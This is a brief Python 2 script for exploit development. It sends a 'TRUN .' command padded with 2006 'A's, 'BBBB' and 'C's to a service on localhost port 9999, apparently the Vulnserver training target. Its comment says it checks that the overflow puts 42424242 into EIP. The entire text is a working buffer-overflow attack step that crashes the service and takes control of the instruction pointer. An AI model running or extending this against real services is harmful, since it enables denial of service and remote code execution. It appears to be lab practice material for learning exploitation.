#!/usr/bin/env python
import socket
import sys

# Validating that 42424242 will be loaded into EIP when the overflow
# is triggered.

buffer = "TRUN ."
buffer += "A" * 2006 + "BBBB" + "C" * 50

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',9999))
print s.recv(1024)
s.send(buffer)
data = s.recv(1024)
print "receiving data"
print data
s.close()

